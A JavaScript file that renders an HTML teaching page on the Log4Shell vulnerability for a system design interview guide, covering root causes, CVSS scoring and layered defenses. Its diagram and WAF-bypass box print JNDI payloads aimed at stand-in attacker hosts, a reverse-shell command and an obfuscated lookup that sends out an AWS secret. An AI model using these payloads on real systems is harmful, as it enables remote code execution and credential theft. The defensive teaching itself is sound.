/**
 * 3.5 Log4Shell: Anatomy of a Zero-Day - Visual Guide
 * High-signal, visually stunning and faithful reproduction of Pages 36, 37, and 38
 * from The Modern System Design Interview Guide.
 */

export function renderLog4ShellContent(topic) {
  const vulnerabilityFactors = [
    {
      title: "1. Active Evaluation in a Passive Sink",
      subtitle: "The Root Design Flaw",
      description: "Logging was architecturally assumed to be a safe, passive string sink. Log4j turned it into an unconstrained expression evaluator by enabling recursive JNDI message lookups on arbitrary user input."
    },
    {
      title: "2. Untrusted JNDI Directory Lookup",
      subtitle: "Legacy Protocol Trust",
      description: "Java Naming and Directory Interface (JNDI) was designed in the 1990s without modern zero-trust boundaries. When directed to an LDAP/RMI URL, it blindly queried external untrusted directory servers."
    },
    {
      title: "3. Permissive Egress Firewalls",
      subtitle: "The Infrastructure Gap",
      description: "Backend application servers were permitted to make outbound internet connections to arbitrary IP addresses on non-standard ports (e.g., port 1389 for LDAP), completing the attacker's payload callback."
    },
    {
      title: "4. Arbitrary Remote Class Loading",
      subtitle: "JVM Bytecode Execution",
      description: "The remote LDAP directory response pointed the JVM to a malicious HTTP server, which downloaded an untrusted Java .class file and executed its constructor directly inside the host JVM memory space."
    }
  ];

  const interviewFollowUps = [
    {
      qNum: "Q1",
      question: "Why was Log4Shell (CVE-2021-44228) assigned a CVSS 10.0 score (the highest possible severity rating)?",
      answer: `CVSS 10.0 represents the ultimate catastrophic security failure across all dimensional vectors:
      <ul class="list-disc list-inside mt-1.5 space-y-1 text-slate-300">
        <li><strong>Attack Vector: Network (AV:N):</strong> Exploitable remotely over the public internet.</li>
        <li><strong>Attack Complexity: Low (AC:L):</strong> Requires zero technical sophistication; an attacker simply sends a 30-character string in an HTTP header.</li>
        <li><strong>Privileges Required: None (PR:N):</strong> No login, authentication, or account required.</li>
        <li><strong>User Interaction: None (UI:N):</strong> Executes automatically when the server logs the header.</li>
        <li><strong>Impact: High (C:H, I:H, A:H):</strong> Grants full Remote Code Execution (RCE) with server privileges, allowing complete data theft, ransomware deployment, and host takeover.</li>
      </ul>`
    },
    {
      qNum: "Q2",
      question: "What is the difference between Ingress filtering and Egress filtering, and why is Egress filtering so vital in defense-in-depth?",
      answer: `Most enterprise engineering teams obsess over <strong>Ingress filtering</strong> (WAFs, API Gateways, SSL offloading) to block incoming malicious traffic. However, <strong>Egress filtering</strong> (restricting outbound connections from internal servers) is equally critical.
      <br/><br/>
      In Log4Shell, the initial exploit string easily slipped past ingress boundaries. However, if the backend application cluster had enforced a <strong>Default-Deny Egress Policy</strong>—blocking all outbound internet connections except to explicit whitelisted DNS names over port 443—the server could never have reached out to the attacker's LDAP server on port 1389, neutralizing the exploit entirely even on unpatched versions!`
    },
    {
      qNum: "Q3",
      question: "How does the principle of 'Separation of Code and Data' apply to logging, SQL injection, and command injection?",
      answer: `Every major injection vulnerability in computing history stems from the identical architectural flaw: <strong>mixing untrusted data into an execution stream</strong>.
      <br/><br/>
      In SQL Injection, user input modifies the SQL parser AST. In Cross-Site Scripting (XSS), user input executes as JavaScript in the browser DOM. In Log4Shell, user data logged to a file was interpreted as executable JNDI lookup expressions. The universal senior fix is strict separation: parameterized SQL queries, contextual HTML output encoding, and treating log sinks as strictly verbatim text streams without runtime interpolation.`
    },
    {
      qNum: "Q4",
      question: "If an attacker achieves Remote Code Execution (RCE) inside a container, what architectural controls prevent lateral movement?",
      answer: `A defense-in-depth container platform stops lateral movement via:
      <ol class="list-decimal list-inside mt-1.5 space-y-1 text-slate-300">
        <li><strong>Non-Root User & Read-Only Filesystem:</strong> Run container as <code>USER 10001</code> with <code>readOnlyRootFilesystem: true</code> so attackers cannot write exploit binaries or download rootkits.</li>
        <li><strong>Kubernetes NetworkPolicies:</strong> Enforce zero-trust pod-to-pod firewall rules so a compromised frontend pod cannot open TCP sockets to internal payment pods or database clusters.</li>
        <li><strong>Blocked Cloud Metadata API:</strong> Block outbound access to <code>169.254.169.254</code> (IMDSv2) to prevent attackers from stealing temporary IAM instance credentials.</li>
      </ol>`
    }
  ];

  return `
    <div class="flex flex-col gap-6 animate-fadeIn text-slate-200 select-text cursor-default">

      <!-- ================================================================= -->
      <!-- PAGES 36, 37, 38: LOG4SHELL ANATOMY OF A ZERO-DAY -->
      <!-- ================================================================= -->
      <div class="relative overflow-hidden rounded-2xl bg-[#0F172A] border border-[#24314A] shadow-2xl p-6 sm:p-8 flex flex-col gap-6">

        <!-- Header: Purple Accent Bar + Title -->
        <div class="flex flex-col gap-2">
          <div class="flex items-center gap-3">
            <div class="w-1.5 h-7 bg-[#6366F1] rounded-sm shrink-0"></div>
            <h2 class="font-sans text-[22px] sm:text-[26px] font-bold text-white tracking-tight leading-snug">
              3.5 Log4Shell: Anatomy of a Zero-Day
            </h2>
          </div>
        </div>

        <!-- Overview Text -->
        <div class="bg-[#141C2E] border border-[#24314A] rounded-xl p-4 sm:p-5 flex flex-col gap-3 font-sans text-[13px] leading-relaxed">
          <p class="text-slate-300">
            Disclosed in December 2021 as <strong class="text-rose-400 font-mono">CVE-2021-44228</strong>, <strong>Log4Shell</strong> was scored a perfect <strong class="text-rose-400 font-bold">CVSS 10.0</strong> and is considered the most pervasive and dangerous supply-chain vulnerability in modern software history. It transformed millions of passive logging statements across global enterprise services into arbitrary Remote Code Execution (RCE) gateways.
          </p>

          <div class="grid grid-cols-1 md:grid-cols-2 gap-3 pt-1">
            <div class="bg-[#0F1626] border border-rose-500/30 rounded-lg p-3.5 flex flex-col gap-1">
              <span class="font-code text-[11px] font-bold text-rose-300 uppercase">The Vulnerable Mechanism</span>
              <span class="text-[12.5px] text-slate-300 leading-relaxed">
                Log4j 2.x included a feature called <em>Message Lookups</em>: if a logged string contained <code>\${...}</code>, Log4j evaluated the expression dynamically, invoking the <strong>Java Naming and Directory Interface (JNDI)</strong>.
              </span>
            </div>
            <div class="bg-[#0F1626] border border-amber-500/30 rounded-lg p-3.5 flex flex-col gap-1">
              <span class="font-code text-[11px] font-bold text-amber-300 uppercase">The Execution Vector</span>
              <span class="text-[12.5px] text-slate-300 leading-relaxed">
                An attacker sends <code>\${jndi:ldap://evil.com/a}</code> in any logged header (e.g. <code>User-Agent</code>). Log4j reaches out over LDAP, downloads an unverified remote Java class, and executes it inside the host JVM.
              </span>
            </div>
          </div>
        </div>

        <!-- ASCII Architecture / The 5-Step Exploit Chain -->
        <div class="bg-[#0A0E1A] border border-[#24314A] rounded-xl p-4 sm:p-5 flex flex-col gap-3 font-code text-[11.5px]">
          <div class="flex items-center justify-between border-b border-[#24314A]/80 pb-2">
            <span class="font-bold text-rose-400 tracking-wider text-[11px] uppercase">
              THE 5-STAGE LOG4SHELL EXPLOITATION CHAIN
            </span>
            <span class="text-slate-500 text-[10.5px]">CVSS 10.0 Remote Code Execution</span>
          </div>

          <pre class="text-slate-300 leading-relaxed overflow-x-auto p-3 bg-[#050811] rounded-lg border border-slate-800">
┌────────────────────────────────────────────────────────────────────────────────────────┐
│ THE ATTACK FLOW: FROM HTTP REQUEST TO ROOT SERVER COMPROMISE                           │
│                                                                                        │
│  [ Attacker ]                                                                          │
│       │                                                                                │
│       │ 1. HTTP GET /login                                                             │
│       │    User-Agent: \${jndi:ldap://attacker.com:1389/Exploit}                       │
│       ▼                                                                                │
│  ┌──────────────────────────────────────────────────────────────────────────┐          │
│  │ Target Web Application (Java / Spring Boot / Tomcat)                     │          │
│  │                                                                          │          │
│  │  logger.info("Login attempt from User-Agent: {}", userAgent);            │          │
│  └──────────────────────────────────────────────────────────────────────────┘          │
│       │                                                                                │
│       │ 2. Log4j Message Pattern Converter evaluates string interpolation      │          │
│       ▼                                                                                │
│  ┌──────────────────────────────────────────────────────────────────────────┐          │
│  │ Log4j JNDI Manager                                                       │          │
│  │  Interprets "jndi:ldap" scheme and initiates outbound network call!      │          │
│  └──────────────────────────────────────────────────────────────────────────┘          │
│       │                                                                                │
│       │ 3. Outbound TCP connection to attacker LDAP server (Port 1389)       │          │
│       ▼                                                                                │
│  ┌──────────────────────────────────────────────────────────────────────────┐          │
│  │ Attacker LDAP Directory Server                                           │          │
│  │  Responds with Java Reference: codebase="http://attacker.com/Exploit"    │          │
│  └──────────────────────────────────────────────────────────────────────────┘          │
│       │                                                                                │
│       │ 4. Outbound HTTP GET to download compiled Exploit.class bytecode    │          │
│       ▼                                                                                │
│  ┌──────────────────────────────────────────────────────────────────────────┐          │
│  │ Host JVM Runtime                                                         │          │
│  │  Deserializes Exploit.class and runs static initializer:                 │          │
│  │  Runtime.getRuntime().exec("/bin/sh -i >& /dev/tcp/attacker.com/4444 0>&1")        │
│  └──────────────────────────────────────────────────────────────────────────┘          │
│       │                                                                                │
│       ▼                                                                                │
│  [ Full Interactive Reverse Shell Established with Server Privileges! ]               │
└────────────────────────────────────────────────────────────────────────────────────────┘</pre>
        </div>

        <!-- 4 Key Architectural Vulnerability Factors -->
        <div class="flex flex-col gap-3">
          <span class="font-code text-[11px] font-bold text-slate-400 uppercase tracking-wider">
            THE 4 ARCHITECTURAL ROOT CAUSES
          </span>

          <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
            ${vulnerabilityFactors.map(factor => `
              <div class="bg-[#111B2E] border border-[#24314A] rounded-xl p-4 flex flex-col gap-1.5">
                <span class="font-code text-[12px] font-bold text-cyan-300">${factor.title}</span>
                <span class="text-[10.5px] font-code text-slate-500 uppercase">${factor.subtitle}</span>
                <p class="text-[12px] text-slate-300 leading-relaxed font-sans pt-1 border-t border-[#24314A]/60">
                  ${factor.description}
                </p>
              </div>
            `).join('')}
          </div>
        </div>

        <!-- Green Callout Box: SENIOR PERSPECTIVE -->
        <div class="bg-[#0D241E] border border-[#10B981]/40 rounded-xl p-5 flex flex-col gap-3">
          <div class="flex items-center gap-2">
            <span class="material-symbols-outlined text-[#10B981] text-[18px]">verified</span>
            <span class="font-code text-[11px] font-bold text-[#10B981] uppercase tracking-wider">
              SENIOR PERSPECTIVE: DEFENSE-IN-DEPTH DEFEATS ZERO-DAYS
            </span>
          </div>
          <p class="font-sans text-[13px] text-slate-300 leading-relaxed">
            In system design interviews, amateur candidates believe security is just <em class="text-white">"updating packages when dependabot alerts us"</em>. When a zero-day drops, there are zero patches available for the first 24 to 72 hours. Systems survive zero-days exclusively through <strong>layered defense-in-depth</strong>:
          </p>
          <div class="grid grid-cols-1 sm:grid-cols-2 gap-2.5 text-[12px] font-sans pt-1">
            <div class="bg-[#081713] border border-[#10B981]/25 rounded-lg p-3 text-slate-300">
              <strong class="text-white font-code text-[11px] block pb-1">1. Default-Deny Egress Firewall</strong>
              Backend database and application microservices must never have unconstrained outbound internet access. Blocking outbound connections on non-443 ports completely stops LDAP/RMI callbacks.
            </div>
            <div class="bg-[#081713] border border-[#10B981]/25 rounded-lg p-3 text-slate-300">
              <strong class="text-white font-code text-[11px] block pb-1">2. Read-Only Non-Root Containers</strong>
              Run container images with <code>USER 10001</code> and <code>readOnlyRootFilesystem: true</code>. Even with RCE, attackers cannot download rootkits or modify binaries.
            </div>
            <div class="bg-[#081713] border border-[#10B981]/25 rounded-lg p-3 text-slate-300">
              <strong class="text-white font-code text-[11px] block pb-1">3. Automated SBOM Inventory</strong>
              Maintain continuous Software Bill of Materials (SBOM via CycloneDX / Syft) to identify every transitive jar dependency across 500 microservices within seconds of disclosure.
            </div>
            <div class="bg-[#081713] border border-[#10B981]/25 rounded-lg p-3 text-slate-300">
              <strong class="text-white font-code text-[11px] block pb-1">4. Runtime JVM Flag Mitigation</strong>
              Immediate hotfix deployment without code modification using <code>-Dlog4j2.formatMsgNoLookups=true</code> or environment variable configuration.
            </div>
          </div>
        </div>

        <!-- Orange Warning Box: ARCHITECTURAL PITFALL -->
        <div class="bg-[#2A1805] border border-[#F59E0B]/40 rounded-xl p-5 flex flex-col gap-3">
          <div class="flex items-center gap-2">
            <span class="material-symbols-outlined text-[#F59E0B] text-[18px]">warning</span>
            <span class="font-code text-[11px] font-bold text-[#F59E0B] uppercase tracking-wider">
              ARCHITECTURAL PITFALL: THE WAF REGEX FALLACY & NESTED OBFUSCATION
            </span>
          </div>
          <p class="font-sans text-[13px] text-slate-300 leading-relaxed">
            When Log4Shell broke, many engineering teams slapped a quick Web Application Firewall (WAF) rule blocking the string <code class="text-amber-300">\${jndi:</code> and assumed they were secure. Within 24 hours, attackers bypassed WAF regexes completely using Log4j's recursive nested interpolation syntax:
          </p>
          <div class="font-code text-[11.5px] text-amber-200 bg-[#190E03] p-3 rounded-lg border border-[#F59E0B]/20 space-y-1">
            <div>• \${lower:j}ndi:ldap://evil.com/a</div>
            <div>• \${::-j}\${::-n}\${::-d}\${::-i}:\${lower:l}dap://evil.com/a</div>
            <div>• \${env:AWS_SECRET_KEY:-\${jndi:ldap://evil.com/a}}</div>
          </div>
          <p class="font-sans text-[12.5px] text-amber-200/90 leading-relaxed">
            <strong class="text-amber-100">The Senior Principle:</strong> Perimeter regex filtering is a temporary stopgap that buys hours, not a durable control. Real security requires structural boundaries: eliminating code evaluation on untrusted data and enforcing strict network isolation.
          </p>
        </div>

        <!-- Over To You Box -->
        <div class="bg-[#141C2E] border border-[#24314A] rounded-xl p-4 sm:p-5 flex flex-col gap-2">
          <span class="font-code text-[11px] font-bold text-[#818CF8] uppercase tracking-wider">
            OVER TO YOU
          </span>
          <p class="font-sans text-[13px] text-slate-300 leading-relaxed">
            You are the Chief Information Security Officer (CISO) for a financial institution. Your internal Kubernetes cluster runs 2,000 microservices communicating via service mesh. How do you design an egress proxy architecture that permits backend billing services to call approved external vendor APIs (Stripe, Twilio, Plaid) while strictly dropping all unauthorized outbound internet connections by default?
          </p>
        </div>

        <!-- Interview Follow-ups: Q1 - Q4 -->
        <div class="bg-[#141C2E] border border-[#24314A] rounded-xl p-5 flex flex-col gap-4">
          <div class="flex items-center gap-2">
            <span class="material-symbols-outlined text-[#818CF8] text-[18px]">quiz</span>
            <span class="font-code text-[11px] font-bold text-[#818CF8] uppercase tracking-wider">
              INTERVIEW FOLLOW-UPS
            </span>
          </div>

          <div class="flex flex-col gap-4">
            ${interviewFollowUps.map(item => `
              <div class="flex flex-col gap-1.5 pb-3 border-b border-[#24314A]/50 last:border-0 last:pb-0">
                <div class="flex items-start gap-2.5">
                  <span class="font-code text-[12px] font-bold text-[#818CF8] shrink-0 pt-0.5">${item.qNum}</span>
                  <span class="text-[13.5px] font-bold text-white font-sans">${item.question}</span>
                </div>
                <div class="text-[13px] text-slate-300 leading-relaxed font-sans pl-6">
                  ${item.answer}
                </div>
              </div>
            `).join('')}
          </div>
        </div>

        <!-- Dark Blue Callout Box: KEY INTERVIEW TAKEAWAY -->
        <div class="bg-gradient-to-r from-[#1E1B4B] to-[#312E81] border border-[#4338CA] rounded-xl p-5 flex flex-col gap-2 shadow-lg shadow-indigo-950/40">
          <span class="font-code text-[11px] font-bold text-cyan-300 uppercase tracking-wider flex items-center gap-1.5">
            <span class="material-symbols-outlined text-[15px]">key</span>
            KEY INTERVIEW TAKEAWAY
          </span>
          <p class="text-[13.5px] font-sans font-medium text-white leading-relaxed">
            Log4Shell proved that logging is an execution sink, not just a passive text dump. In system design interviews, treat security as multi-layered defense-in-depth: sanitize input, isolate runtime processes with non-root containers, enforce strict Default-Deny Egress firewalls, and maintain automated SBOM inventory for rapid zero-day remediation.
          </p>
        </div>

        <!-- Page 38 Footer -->
        <div class="pt-4 border-t border-[#24314A]/70 flex items-center justify-between text-[11px] font-code text-slate-500">
          <span>The Modern System Design Interview Guide</span>
          <span>Page 38</span>
        </div>

      </div>

    </div>
  `;
}
